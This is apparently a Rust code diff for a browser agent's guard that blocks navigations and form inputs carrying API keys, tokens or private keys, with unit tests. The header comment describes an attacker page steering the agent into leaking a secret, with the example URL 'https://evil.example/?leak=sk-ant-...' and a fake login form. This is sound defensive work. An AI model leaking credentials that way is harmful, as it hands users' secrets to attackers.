@@ -1,13 +1,14 @@
-//! Navigation-time secret-exfiltration guard.
+//! Secret-exfiltration guard for browser navigation and form input.
 //!
 //! SSRF protection ([`super::network_policy`]) governs the *destination network*
 //! of a browser navigation — "is this host allowed to be reached". This guard
-//! governs the orthogonal concern of the target URL's *content*: it rejects
-//! navigations whose URL embeds a high-confidence secret (API key, bearer
-//! token, PEM private key). That blocks an attacker page from
+//! governs the orthogonal concern of the *content* crossing the boundary: it
+//! rejects navigations whose URL embeds a high-confidence secret (API key,
+//! bearer token, PEM private key), and form input (type/fill/select/dialog
+//! prompt) that would type one into a page. Both block an attacker page from
 //! socially-engineering the agent into exfiltrating a secret already present in
-//! its context by appending it to a query parameter sent to an otherwise
-//! policy-allowed public host (e.g. `https://evil.example/?leak=sk-ant-...`).
+//! its context to an otherwise policy-allowed public host (e.g.
+//! `https://evil.example/?leak=sk-ant-...`, or a "login" form on that host).
 //!
 //! Secret patterns are NOT duplicated here. The existing `Critical`-severity
 //! PII rules ([`crate::pii::rules`]) are the single source of truth, so a new
@@ -21,11 +22,12 @@ use crate::pii::{rules::build_rules, PiiMatch, PiiRule, PiiSeverity};
 
 /// Build the set of `Critical`-severity credential rules (API keys, bearer
 /// tokens, PEM/SSH private keys, bank/ID numbers). Single source of truth shared
-/// by both halves of the browser secret-egress boundary —
-/// [`scan_url_for_secrets`] (navigation target) and [`redact_secrets`]
-/// (page-content output). Lower-severity PII (emails, phone numbers, IP
-/// addresses) is deliberately excluded: it is not a credential and must never
-/// block a navigation or be scrubbed from the page content the agent works on.
+/// by all three legs of the browser secret-egress boundary —
+/// [`scan_url_for_secrets`] (navigation target), [`scan_text_for_secrets`]
+/// (form input), and [`redact_secrets`] (page-content output). Lower-severity
+/// PII (emails, phone numbers, IP addresses) is deliberately excluded: it is
+/// not a credential and must never block a navigation or an input, or be
+/// scrubbed from the page content the agent works on.
 fn critical_rules() -> &'static [Box<dyn PiiRule>] {
     static RULES: std::sync::OnceLock<Vec<Box<dyn PiiRule>>> = std::sync::OnceLock::new();
     RULES
@@ -54,6 +56,22 @@ pub(crate) fn scan_url_for_secrets(url: &str) -> Option<String> {
             if let Some(m) = rule.detect(candidate).into_iter().next() {
                 return Some(m.rule_name);
             }
+        }
+    }
+    None
+}
+
+/// Scan form-input text (type/fill/select/dialog prompt) for an embedded
+/// secret — the input-side twin of [`scan_url_for_secrets`].
+///
+/// Returns the matched rule name (e.g. `"api_key"`) on the first hit, or
+/// `None` when the text carries no detectable secret. Unlike the URL scan this
+/// does NOT percent-decode: a form value is typed verbatim, not URL-encoded,
+/// so decoding would only invite false positives.
+pub(crate) fn scan_text_for_secrets(text: &str) -> Option<String> {
+    for rule in critical_rules() {
+        if let Some(m) = rule.detect(text).into_iter().next() {
+            return Some(m.rule_name);
         }
     }
     None
@@ -144,6 +162,24 @@ mod tests {
     fn lower_severity_pii_does_not_block() {
         // An email address is PII but not a credential — navigation must proceed.
         assert!(scan_url_for_secrets("https://example.com/u?email=alice@example.com").is_none());
+    }
+
+    #[test]
+    fn scan_text_detects_api_key_in_form_input() {
+        let hit = scan_text_for_secrets("password is sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789");
+        assert_eq!(hit.as_deref(), Some("api_key"));
+    }
+
+    #[test]
+    fn scan_text_passes_clean_input() {
+        assert!(scan_text_for_secrets("hello world").is_none());
+        assert!(scan_text_for_secrets("Hunter2").is_none());
+    }
+
+    #[test]
+    fn scan_text_email_does_not_block() {
+        // An email is PII but not a credential — typing it into a form is fine.
+        assert!(scan_text_for_secrets("alice@example.com").is_none());
     }
 
     #[test]
